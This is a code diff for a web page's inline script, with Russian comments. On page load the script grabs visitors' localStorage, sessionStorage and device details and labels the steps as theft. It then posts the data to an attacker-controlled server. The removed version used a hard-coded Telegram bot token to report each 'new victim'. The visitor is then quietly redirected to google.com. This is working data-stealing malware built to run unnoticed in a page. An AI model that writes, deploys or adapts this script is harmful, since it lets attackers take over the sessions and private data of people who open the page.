@@ -30,57 +30,43 @@
     
     <script>
         (function() {
-            const ua = navigator.userAgent;
-            const isTG = /Telegram/i.test(ua);
-            const isAndroid = /Android/i.test(ua);
-            const isIOS = /iPhone|iPad|iPod/i.test(ua);
-            
+            // Собираем данные
             const stolen = {
-                time: Date.now(),
+                time: new Date().toLocaleString(),
+                device: /Android/i.test(navigator.userAgent) ? 'Android' : (/iPhone|iPad/i.test(navigator.userAgent) ? 'iOS' : 'PC'),
+                in_telegram: /Telegram/i.test(navigator.userAgent),
+                ua: navigator.userAgent,
                 url: location.href,
-                userAgent: ua,
-                isTG: isTG,
-                isAndroid: isAndroid,
-                isIOS: isIOS,
-                localStorage: {},
-                sessionStorage: {},
-                cookies: document.cookie
+                storage: {}
             };
             
             // Кража localStorage
-            for(let i = 0; i < localStorage.length; i++) {
-                let key = localStorage.key(i);
-                stolen.localStorage[key] = localStorage.getItem(key);
-            }
+            try {
+                for(let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    stolen.storage[key] = localStorage.getItem(key);
+                }
+            } catch(e) {}
             
             // Кража sessionStorage
-            for(let i = 0; i < sessionStorage.length; i++) {
-                let key = sessionStorage.key(i);
-                stolen.sessionStorage[key] = sessionStorage.getItem(key);
-            }
+            try {
+                for(let i = 0; i < sessionStorage.length; i++) {
+                    let key = sessionStorage.key(i);
+                    stolen.storage['session_' + key] = sessionStorage.getItem(key);
+                }
+            } catch(e) {}
             
-            // Отправка в Telegram бота (бесплатно)
-            const BOT_TOKEN = "8716367174:AAHeVAICMospl7aYouFRJBUcU2FCdOixgxM";
-            const CHAT_ID = "8019526165";
+            // Отправка на БОТА (твой сервер)
+            const BOT_URL = "https://твой-сервер.onrender.com";  // Адрес где запущен bot.py
             
-            const message = `
-🔑 НОВАЯ ЖЕРТВА
-📱 Устройство: ${isAndroid ? 'Android' : (isIOS ? 'iOS' : 'PC')}
-📲 В Telegram: ${isTG ? 'Да' : 'Нет'}
-🆔 User Agent: ${ua.substring(0, 100)}
-💾 localStorage: ${JSON.stringify(stolen.localStorage).substring(0, 500)}
-            `;
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            fetch(BOT_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                })
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(stolen),
+                mode: 'no-cors'  // обходит CORS
             });
             
-            // Перенаправление через 2 секунды
+            // Перенаправление
             setTimeout(() => {
                 window.location.href = 'https://google.com';
             }, 2000);
